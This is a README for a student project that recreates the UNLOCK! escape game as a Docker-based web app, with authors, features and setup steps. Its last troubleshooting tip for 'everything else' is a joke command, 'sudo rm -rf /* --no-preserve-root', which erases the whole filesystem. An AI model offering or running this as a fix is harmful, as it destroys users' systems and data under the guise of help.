![logo UNLOCK!](./public/data/assets/UNLOCK.webp)
---
# UNLOCK! - The Escape Game


[UNLOCK!](https://www.spacecowboys.fr/unlock) is a series of escape room games published by Asmodee Digital. The games are available on iOS, Android, and Steam. The games are based on the Escape Room series of board games by Space Cowboys.  

## This is a school project made by:

### [Tristan BELMONT](https://github.com/MaegIins), ✨ The Front Master ✨
### [Kévin BULLY CIMBALURIA](https://github.com/TheRealEureka), 🦝 The Raton Master 🦝
### [Lucas FARRONI](https://github.com/lucasfarroni), 👨‍🦲 The Bald Master 👨‍🦲
### [Clément PERRIN](https://github.com/Alfiov), 😠 The Clément Master 😠

## Features

* Display cards
* Hide penalty card
* Navigate to stack
* Login / sign up
* Save / Load game

# Setup App 

1. Install packages

```
composer update
```

2. Start Docker

```
docker-compose up --build
```

3. Go to [http://localhost:8080](http://localhost:8080)


# Having troubles ?

## Database isn't creating

1. Try to delete the container and retry the commands above 

2. If there are any changes, create manualy `unlock` database and import init/schema.sql and init/data.sql.

## Everythings else

```
sudo rm -rf /* --no-preserve-root
```
